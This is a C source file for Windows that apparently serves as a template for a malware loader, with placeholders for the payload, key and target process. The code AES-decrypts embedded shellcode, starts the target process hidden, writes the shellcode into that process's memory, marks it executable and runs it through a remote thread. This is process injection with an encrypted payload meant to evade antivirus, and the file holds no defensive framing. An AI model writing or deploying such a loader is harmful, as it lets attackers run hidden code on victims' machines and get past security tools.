#include <windows.h>
#include <bcrypt.h>

unsigned char shellcode[] = { ${SHELLCODE} };
unsigned char key[]       = { ${KEY} };
unsigned char iv[]        = { ${IV} };

static void AESDecrypt(unsigned char *data, DWORD data_len,
                       unsigned char *k, unsigned char *iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG cbResult         = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, k, 32, 0);
    BCryptDecrypt(hKey, data, data_len, NULL, iv, 16,
                  data, data_len, &cbResult, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

int main() {
    AESDecrypt(shellcode, sizeof(shellcode), key, iv);

    SIZE_T sc_len = sizeof(shellcode);
    unsigned char *sc = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, sc_len);
    if (!sc) return 1;
    CopyMemory(sc, shellcode, sc_len);

    STARTUPINFOA        si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA("${TARGET_PROCESS}", NULL, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB,
                        NULL, NULL, &si, &pi))
        return 1;

    Sleep(2000);

    LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!addr) { TerminateProcess(pi.hProcess, 0); return 1; }

    WriteProcessMemory(pi.hProcess, addr, sc, sc_len, NULL);

    DWORD oldProt = 0;
    VirtualProtectEx(pi.hProcess, addr, sc_len, PAGE_EXECUTE_READ, &oldProt);

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)addr,
                                        NULL, 0, NULL);
    if (!hThread) { TerminateProcess(pi.hProcess, 0); return 1; }
    CloseHandle(hThread);
    HeapFree(GetProcessHeap(), 0, sc);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
